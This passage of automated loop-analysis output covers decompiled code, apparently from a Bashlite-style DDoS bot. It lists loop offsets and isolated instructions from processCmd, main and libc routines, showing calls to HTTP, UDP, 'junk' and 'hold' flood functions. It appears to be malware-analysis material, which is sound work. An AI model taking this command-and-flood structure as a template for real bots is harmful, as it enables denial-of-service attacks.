		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 180 @ processCmd ====================================
++++++++ WHILE START : 24133 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24142 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 181 @ processCmd ====================================
++++++++ WHILE START : 24169 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24181 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 182 @ processCmd ====================================
++++++++ WHILE START : 24303 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24315 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 183 @ processCmd ====================================
++++++++ WHILE START : 24377 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24386 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 184 @ processCmd ====================================
++++++++ WHILE START : 24413 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24425 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 185 @ processCmd ====================================
++++++++ WHILE START : 24468 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24478 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v196, v171, v172);
		__libc_close(v142);
=============================WHILE LOOPS ID : 186 @ processCmd ====================================
++++++++ WHILE START : 24511 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24523 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 187 @ processCmd ====================================
++++++++ WHILE START : 24585 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24594 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 188 @ processCmd ====================================
++++++++ WHILE START : 24621 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24633 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 189 @ processCmd ====================================
++++++++ WHILE START : 24683 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24692 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHOLD(v194, v167, v168);
=============================WHILE LOOPS ID : 190 @ processCmd ====================================
++++++++ WHILE START : 24731 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24743 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 191 @ processCmd ====================================
++++++++ WHILE START : 24805 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24814 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 192 @ processCmd ====================================
++++++++ WHILE START : 24841 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24853 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 193 @ processCmd ====================================
++++++++ WHILE START : 24896 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24906 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v196, v171, v172);
		__libc_close(v142);
=============================WHILE LOOPS ID : 194 @ processCmd ====================================
++++++++ WHILE START : 24939 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24951 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 195 @ processCmd ====================================
++++++++ WHILE START : 25013 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25022 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 196 @ processCmd ====================================
++++++++ WHILE START : 25049 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25061 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 197 @ getOurIP ====================================
++++++++ WHILE START : 25473 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 25553 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strstr(v150, "\t00000000\t") == 0) {
		if (fdgets(v150, 0x1000, v148) == 0) {
		__libc_close(v148);
		__libc_close(v141);
		__libc_close(v141);
		__libc_close(v148);
		__libc_close(v141);
		__libc_close(v141);
=============================WHILE LOOPS ID : 198 @ main ====================================
++++++++ WHILE START : 25942 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26398 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		getBuild();
		__GI_inet_ntoa(v157);
		HackerPrint(v157, 1);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (recvLine() == -1) {
		while (true) {
		v186 = __libc_waitpid(v179, v176, v178);
		while (true) {
		while (true) {
		free(0);
		if (strstr(v184, (char *)&v192) != v167) {
		int32_t v193 = strstr(v184, (char *)&v192); // 0x8051045
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		processCmd();
		processCmd();
		if (listFork() != 0) {
		szprintf(v210, v170, (int32_t)v168, v171);
		int32_t v232 = fdpopen(); // 0x8051207
		while (true) {
		if (fdgets(v232, v169, (int32_t)&v192) != 0) {
		fdpclose();
		free(v234);
		free(v234);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		HackerPrint(v184, (int32_t)&v192);
		while (true) {
		if (recvLine() != -1) {
		v186 = __libc_waitpid(v179, v176, v178);
		getBuild();
		__GI_inet_ntoa(v157);
		HackerPrint(v157, 1);
=============================WHILE LOOPS ID : 199 @ main ====================================
++++++++ WHILE START : 26422 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26428 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 203 @ _vfprintf_internal ====================================
++++++++ WHILE START : 32841 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 33502 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 206 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 34507 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 35420 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 212 @ strstr ====================================
++++++++ WHILE START : 36970 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 37072 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 213 @ strcasestr ====================================
++++++++ WHILE START : 37815 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 37876 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 217 @ malloc ====================================
++++++++ WHILE START : 43167 
++++++++ WHILE FUNCTION : malloc 
++++++++ WHILE END : 45344 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
		free(v253);
=============================WHILE LOOPS ID : 221 @ __malloc_consolidate ====================================
++++++++ WHILE START : 46822 
++++++++ WHILE FUNCTION : __malloc_consolidate 
++++++++ WHILE END : 46944 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 222 @ abort ====================================
++++++++ WHILE START : 47587 
++++++++ WHILE FUNCTION : abort 
++++++++ WHILE END : 47662 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v144, 0);
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 223 @ srandom_r ====================================
++++++++ WHILE START : 48941 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 48976 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)a2, (int32_t)&v147);
		__GI_random_r((int32_t *)a2, (int32_t)&v147);
=============================WHILE LOOPS ID : 228 @ sleep ====================================
++++++++ WHILE START : 50697 
++++++++ WHILE FUNCTION : sleep 
++++++++ WHILE END : 50791 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v148 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v144, v147); // 0x805479f
		while (true) {
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
=============================WHILE LOOPS ID : 231 @ __stdio_WRITE ====================================
++++++++ WHILE START : 56722 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 56796 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 234 @ _fpmaxtostr ====================================
++++++++ WHILE START : 58180 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 61411 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 241 @ __GI_strpbrk ====================================
++++++++ WHILE START : 62581 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 62630 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 242 @ inet_aton ====================================
++++++++ WHILE START : 62788 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 62882 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 243 @ __dns_lookup ====================================
++++++++ WHILE START : 63066 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 63930 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(-1);
		if (inet_pton(-1, (char *)v156, v158, (int32_t)&v151) >= 1) {
		inet_addr(-1);
		if (socket(-1, v156, v158) >= 0) {
		if (__libc_connect(-1, v156, v158) >= 0) {
		__libc_send(-1, v156, v158, (int32_t)&v151);
		int32_t v173 = __libc_recv(-1, v156, v158, (int32_t)&v151); // 0x8055fd6
		__libc_close(v146);
		free(v147);
		free(v147);
		while (true) {
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		v212 = __libc_close(-1);
		v213 = free(-1);
		v214 = free(-1);
		v214 = free(-1);
		v212 = __libc_close(-1);
		v213 = free(-1);
		v214 = free(-1);
		v214 = free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		__libc_close(v146);
		free(v147);
		free(v147);
		__libc_close(v146);
		free(v147);
		free(v147);
		__libc_close(v146);
		free(v147);
		free(v147);
		__libc_close(v146);
		free(v147);
		free(v147);
=============================WHILE LOOPS ID : 245 @ __open_nameservers ====================================
++++++++ WHILE START : 64294 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 64609 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (fgets(v153, 128, v147) == 0) {
		while (true) {
		free(v195);
		__GI_fclose((int16_t *)v144);
		while (true) {
		if (fgets(v153, 128, v147) == 0) {
		if (fgets(v153, 128, v147) == 0) {
		__GI_fclose((int16_t *)v144);
		if (fgets(v153, 128, v147) == 0) {
=============================WHILE LOOPS ID : 246 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 68002 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 68039 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v151);
=============================WHILE LOOPS ID : 248 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 68450 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 68510 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v149 = getc_unlocked(); // 0x8056ed1
=============================WHILE LOOPS ID : 253 @ __GI_strspn ====================================
++++++++ WHILE START : 69276 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 69321 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 255 @ inet_pton ====================================
++++++++ WHILE START : 69893 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 70146 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_pton4(v160, (int32_t)v161, v150) >= 1) {
=============================WHILE LOOPS ID : 257 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 70546 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 70894 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		v184 = inet_ntop4((int32_t)v149, (int32_t)v163, v162);
		v180 = v146 + sprintf(v179, (int32_t)"%x");
		v184 = inet_ntop4((int32_t)v149, (int32_t)v163, v162);
		v180 = v146 + sprintf(v179, (int32_t)"%x");
		while (true) {
=============================WHILE LOOPS ID : 261 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 72266 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 72497 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		int32_t v186 = __GI_strcasecmp(v158, v185, v164, v164); // 0x8057a82
		if (fgets(v159, v144, v142) == 0) {
		if (inet_pton(10, (char *)v189, v146, v165) >= 1) {
		__GI_fclose((int16_t *)v144);
		if (inet_pton(2, (char *)v191, (int32_t)v147, v143) >= 1) {
		__GI_fclose((int16_t *)v144);
		if (fgets(v159, v144, v142) == 0) {
		if (fgets(v159, v144, v142) == 0) {
		__GI_fclose((int16_t *)v144);
=============================WHILE LOOPS ID : 264 @ __decode_dotted ====================================
++++++++ WHILE START : 73676 
++++++++ WHILE FUNCTION : __decode_dotted 
++++++++ WHILE END : 73747 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
